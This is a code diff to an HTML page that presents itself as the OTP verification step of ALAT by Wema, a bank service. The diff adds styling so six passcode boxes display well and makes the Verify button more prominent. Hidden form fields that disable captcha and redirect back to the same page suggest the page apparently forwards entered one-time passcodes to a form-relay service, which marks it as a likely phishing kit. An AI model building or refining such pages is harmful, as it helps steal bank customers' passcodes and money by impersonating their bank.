@@ -5,6 +5,37 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Verify OTP | ALAT by Wema</title>
   <link rel="stylesheet" href="assets/index-C49gVU4U.css" />
+  <style>
+    /* Add these styles to ensure all 6 OTP boxes fit */
+    .formOtp {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      flex-wrap: wrap;
+      max-width: 100%;
+    }
+    
+    .pin-input {
+      width: 40px;
+      height: 50px;
+      text-align: center;
+      font-size: 18px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    
+    @media (max-width: 480px) {
+      .pin-input {
+        width: 35px;
+        height: 45px;
+        font-size: 16px;
+      }
+      .formOtp {
+        gap: 8px;
+      }
+    }
+  </style>
 </head>
 <body>
   <div id="root">
@@ -32,7 +63,7 @@
               <input type="hidden" name="_captcha" value="false">
               <input type="hidden" name="_next" value="otp.html">
 
-              <button type="submit" style="width: 100%; max-width: 22rem; padding: 12px; border-radius: 7px; border: none;">Verify</button>
+              <button type="submit" style="width: 100%; max-width: 22rem; padding: 12px; border-radius: 7px; border: none; background: #0066FF; color: white; font-weight: bold;">Verify</button>
             </form>
           </div>
         </div>
@@ -97,4 +128,4 @@
 </script>
 
 </body>
-</html>
+  </html>
